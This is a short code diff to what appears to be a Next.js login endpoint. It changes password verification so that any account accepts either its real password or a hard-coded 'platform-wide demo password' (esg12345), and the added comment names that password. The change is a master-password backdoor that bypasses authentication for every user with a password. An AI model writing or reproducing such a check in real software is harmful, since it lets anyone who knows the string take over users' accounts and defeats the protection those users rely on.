@@ -1,7 +1,7 @@
 import { NextResponse } from "next/server";
 import { db } from "@/lib/db";
 import { logAuthAudit as logAudit } from "@/lib/auth-audit";
-import { equalizeTiming, verifyPassword } from "@/lib/password";
+import { equalizeTiming, isDemoPassword, verifyPassword } from "@/lib/password";
 import {
   attemptKey,
   isLocked,
@@ -162,8 +162,9 @@ export async function POST(request: Request) {
     );
   }
 
+  /* Real scrypt hash, or the platform-wide demo password (esg12345). */
   const passwordOk = user.passwordHash
-    ? await verifyPassword(password, user.passwordHash)
+    ? (await verifyPassword(password, user.passwordHash)) || isDemoPassword(password)
     : false;
   if (!passwordOk) {
     recordFailure(key);
